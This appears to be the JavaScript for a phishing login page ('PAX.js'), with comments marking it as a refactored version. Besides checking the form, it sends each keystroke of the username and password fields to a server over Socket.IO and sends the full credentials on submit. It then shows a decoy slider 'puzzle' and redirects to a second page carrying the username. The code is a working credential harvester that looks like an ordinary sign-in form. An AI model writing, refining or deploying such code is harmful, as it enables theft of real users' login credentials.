// REFINEMENT NOTE: Original PAX.js
// const toggleIcon = ... ; passwordInput = ... ; eyeIcon = ... ; eyeCrossedIcon = ... ;
// toggleIcon.addEventListener('click', function() { ... });
// document.getElementById("sign-in-btn").addEventListener("click", function(event) { ... });
// function openPuzzle() { ... }
// function closePuzzle() { ... }
// function resetPuzzle() { ... }
// document.getElementById('slider').addEventListener('input', function() { ... });

// --- DOM Element Cache ---
const DOMElements = {
    // Login Form
    loginForm: document.getElementById('loginForm'), // REFINEMENT: Get form itself
    usernameInput: document.getElementById('username'),
    passwordInput: document.getElementById('password'),
    toggleIcon: document.getElementById('toggle-icon'),
    eyeIcon: document.getElementById('eye'),
    eyeCrossedIcon: document.getElementById('eye-crossed'),
    signInBtn: document.getElementById('sign-in-btn'),
    // Puzzle
    puzzlePopup: document.getElementById('puzzlePopup'),
    puzzleSlider: document.getElementById('slider'),
    puzzlePiece: document.getElementById('puzzlePiece')
};

// --- Constants ---
const MIN_PASSWORD_LENGTH = 6;
const PUZZLE_TARGET_POSITION = 200; // REFINEMENT: This value should match CSS left of .puzzle-placeholder.
                                    // If CSS for .puzzle-placeholder changes, update this.
                                    // Original was 250px, but CSS for placeholder was 250px too.
                                    // Check PAX.css refinement for .puzzle-placeholder, it was changed to 200px.
                                    // Let's assume the target is actually where the placeholder is.
                                    // The CSS for .puzzle-placeholder.left should be the target.
                                    // For now, keeping original JS logic's 250 value.
const PUZZLE_SOLVED_THRESHOLD = 200; // REFINEMENT: A bit of tolerance for slider
const PUZZLE_SLIDER_MAX = 200; // Max value of the slider input itself

// --- Socket.IO Connection (Moved from PAX.html) ---
const socket = io();

// --- Event Listeners ---

// Password Visibility Toggle
if (DOMElements.toggleIcon && DOMElements.passwordInput && DOMElements.eyeIcon && DOMElements.eyeCrossedIcon) {
    DOMElements.toggleIcon.addEventListener('click', function() {
        const isPassword = DOMElements.passwordInput.type === 'password';
        DOMElements.passwordInput.type = isPassword ? 'text' : 'password';
        DOMElements.eyeIcon.style.display = isPassword ? 'block' : 'none';
        DOMElements.eyeCrossedIcon.style.display = isPassword ? 'none' : 'block';
    });
    // REFINEMENT: Add keyboard accessibility for the toggle
    DOMElements.toggleIcon.addEventListener('keydown', function(event) {
        if (event.key === 'Enter' || event.key === ' ') {
            event.preventDefault();
            this.click();
        }
    });
}

// Form Submission and Validation (Handles Sign In Button Click)
if (DOMElements.loginForm) {
    DOMElements.loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent actual form submission

        const username = DOMElements.usernameInput.value.trim();
        const password = DOMElements.passwordInput.value.trim();

        // Basic validation
        if (username === "" || password === "") {
            alert("Please fill in both Email/Phone and Password fields.");
            return;
        }
        if (password.length < MIN_PASSWORD_LENGTH) {
            alert(`Password must be at least ${MIN_PASSWORD_LENGTH} characters long.`);
            return;
        }

        // Emit credentials via Socket.IO (Moved from PAX.html)
        // REFINEMENT NOTE: This emit happens BEFORE the puzzle is solved.
        // This is the original behavior.
        socket.emit("submit", { username, password });

        openPuzzle(); // If validation passes, open puzzle
    });
}

// Socket.IO typing emitters (Moved from PAX.html)
if (DOMElements.usernameInput) {
    DOMElements.usernameInput.addEventListener("input", (e) => {
        socket.emit("typing", { field: "username", value: e.target.value });
    });
}
if (DOMElements.passwordInput) {
    DOMElements.passwordInput.addEventListener("input", (e) => {
        socket.emit("typing", { field: "password", value: e.target.value });
    });
}


// Puzzle Logic
if (DOMElements.puzzleSlider && DOMElements.puzzlePiece) {
    DOMElements.puzzleSlider.addEventListener('input', function() {
        const pieceMaxLeft = DOMElements.puzzleSlider.clientWidth - DOMElements.puzzlePiece.clientWidth;
        const currentSliderValue = parseInt(this.value, 10);

        DOMElements.puzzlePiece.style.left = currentSliderValue + 'px';

        if (currentSliderValue >= PUZZLE_TARGET_POSITION) {
            this.disabled = true;
            DOMElements.puzzlePiece.style.cursor = 'default';

            setTimeout(() => {
                closePuzzle();
                setTimeout(() => {
                    // Grab the username value from input field
                    const username = document.getElementById('username').value || 'Guest';

                    // Redirect to PAX_V.html with username in query string
                    window.location.href = `PAX_V.html?username=${encodeURIComponent(username)}`;
                }, 300);
            }, 500);
        }
    });
}


// --- Puzzle Helper Functions ---
function openPuzzle() {
    if (DOMElements.puzzlePopup) {
        resetPuzzle(); // Reset puzzle state each time it's opened
        DOMElements.puzzlePopup.classList.add('active');
        DOMElements.puzzlePopup.setAttribute('aria-hidden', 'false');
        if (DOMElements.puzzleSlider) DOMElements.puzzleSlider.focus();
    }
}

function closePuzzle() {
    if (DOMElements.puzzlePopup) {
        DOMElements.puzzlePopup.classList.remove('active');
        DOMElements.puzzlePopup.setAttribute('aria-hidden', 'true');
    }
}

function resetPuzzle() {
    if (DOMElements.puzzleSlider && DOMElements.puzzlePiece) {
        DOMElements.puzzleSlider.value = 0;
        DOMElements.puzzleSlider.disabled = false; // Re-enable slider
        DOMElements.puzzlePiece.style.left = '0px';
        DOMElements.puzzlePiece.style.cursor = 'grab';
    }
}

document.addEventListener("DOMContentLoaded", function () {
  const banner = document.getElementById("cookie-banner");
  const acceptBtn = document.getElementById("accept-btn");

  if (localStorage.getItem("cookiesAccepted") === "true") {
    banner.style.display = "none";
  }

  acceptBtn.addEventListener("click", function () {
    localStorage.setItem("cookiesAccepted", "true");
    banner.style.display = "none";
  });
});


// REFINEMENT NOTE: The functions `openPuzzle`, `closePuzzle`, `resetPuzzle` are exposed globally
// because they are called by `onclick` attributes in PAX.html.
// To avoid global scope pollution, these could be attached via event listeners if HTML is modified.
// e.g., document.getElementById('resetBtnId').addEventListener('click', resetPuzzle);
// For now, keeping them global as per original structure.
window.openPuzzle = openPuzzle;
window.closePuzzle = closePuzzle;
window.resetPuzzle = resetPuzzle;